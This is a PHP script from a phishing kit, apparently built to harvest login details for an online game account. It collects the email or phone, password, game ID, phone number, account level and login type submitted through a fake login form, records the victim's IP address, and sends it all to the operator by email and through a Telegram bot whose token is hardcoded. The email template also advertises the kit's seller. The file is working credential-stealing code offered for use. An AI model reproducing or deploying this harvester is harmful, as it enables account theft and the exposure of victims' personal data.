<?php
// PANEL BY @CHEIF_YT
include 'system/setting.php';
include 'system/cheifip.php';
include 'email.php';

$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];

// CHEIF IS YOUR DAD
if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == ""){
header("Location: index.php");
}else{

// CHEIF PAPA
$subjek = " 🇮🇳 | +91 | LEVEL $level | RESULTS $email | LOGIN $login";
$pesan = '
<center>
<div style="background: url(https://i.ibb.co/6WQLLBd/a44ff9cf6d6f.gif) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #fff; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: #fff; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">
DATA INFO | Sent : '.$jamasuk.'
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:linear-gradient(90deg,black,grey);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$phone.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$level.'</th>
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$login.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP ADRESS</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$agung_ip_address.'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: #fff; padding: 10px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; text-align:center;">
ADDITIONAL INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:linear-gradient(90deg,black,grey);">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>DATE & TIME</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
<tr>    
                <th style="padding-left: 10px; width: 35%; text-align: left;" height="25px"><b>BUY WEB</th>
                <th style="width: 65%; text-align: center;"><b><a href="https://telegram.me/CHEIF_YT">CLICK HERE</a></th> 
            </tr>
</table>
 <center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

$text = '
🟢 𝐘𝐎𝐔 𝐆𝐎𝐓 𝐍𝐄𝐖 𝐑𝐄𝐒𝐔𝐋𝐓 🎫

🎴 𝐒𝐄𝐍𝐃𝐄𝐑 𝐍𝐀𝐌𝐄 • '.$name.' 

🔶 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𝐎𝐑 𝐄𝐌𝐀𝐈𝐋 🔹  '.$email.'

🔶 𝐔𝐒𝐄𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 🔹 '.$password.'

🔶 𝐏𝐇𝐎𝐍𝐄 𝐍𝐎.  🔹 '.$phone.'

🔶 𝐔𝐒𝐄𝐑 𝐋𝐄𝐕𝐄𝐋 🔹 '.$level.'

🔶 𝐋𝐎𝐆𝐈𝐍 𝐓𝐘𝐏𝐄 🔹 '.$login.'

🔶 𝐆𝐀𝐌𝐄 𝐈𝐃 🔹 '.$playid.'

🔶 𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒 🔹 '.$agung_ip_address.'

🔶 𝐖𝐄𝐁 𝐁𝐘 ▪️ ABBAS';

$tp=urlencode($text);
file_get_contents("https://api.telegram.org/bot7762019373:AAGldJH4xLecO6M3sRfRRCbNPY4Kn8iMaj0/sendmessage?chat_id=5912029339&text=".$tp."&parse_mode=markdown");
}
?>